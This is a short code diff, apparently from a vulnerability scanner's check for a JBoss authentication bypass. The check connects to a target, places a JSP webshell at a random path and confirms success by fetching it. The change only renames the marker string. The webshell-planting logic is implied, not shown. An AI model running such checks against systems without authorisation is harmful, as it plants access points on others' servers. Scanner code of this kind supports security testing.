@@ -32,7 +32,7 @@ def check(host, port, timeout):
         socket.setdefaulttimeout(timeout)
         s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s1.connect((host, int(port)))
-        shell = "xunfeng"
+        shell = "xunfengtest"
         # s1.recv(1024)
         shellcode = ""
         name = random_str(5)
@@ -49,7 +49,7 @@ def check(host, port, timeout):
         url = "http://%s:%d" % (host, int(port))
         webshell_url = "%s/%s/xunfeng.jsp" % (url, name)
         res = urllib2.urlopen(webshell_url, timeout=timeout)
-        if 'xunfeng' in res.read():
+        if 'xunfengtest' in res.read():
             info = u"Jboss Authentication bypass url:%s" % (webshell_url)
             return info
     except Exception, e:
